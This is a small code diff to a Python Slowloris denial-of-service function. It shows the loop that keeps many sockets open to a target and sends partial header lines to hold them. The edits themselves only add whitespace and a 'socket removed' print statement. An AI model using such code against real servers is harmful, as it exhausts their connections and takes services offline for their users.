@@ -46,7 +46,7 @@ def slowloris(IP, port, socket_count):
     # TODO use argv to pass in IP and port and socket count
     try:
         while True:
-
+            
             # Make sure there are still socket_count sockets
             for i in range(socket_count - len(sockets)):
                 try:
@@ -57,12 +57,16 @@ def slowloris(IP, port, socket_count):
                     print("socket could not be established")
                     print(e)
                     break
-
+            
             for s in sockets:
                 try:
                     s.send(f"X-a {random.randint(1,255)}\r\n")
                 except:
                     sockets.remove(s)
+                    print("socket removed")
+                    
+
+            
     except (KeyboardInterrupt, SystemExit):
         print("Stopping slowloris")
         
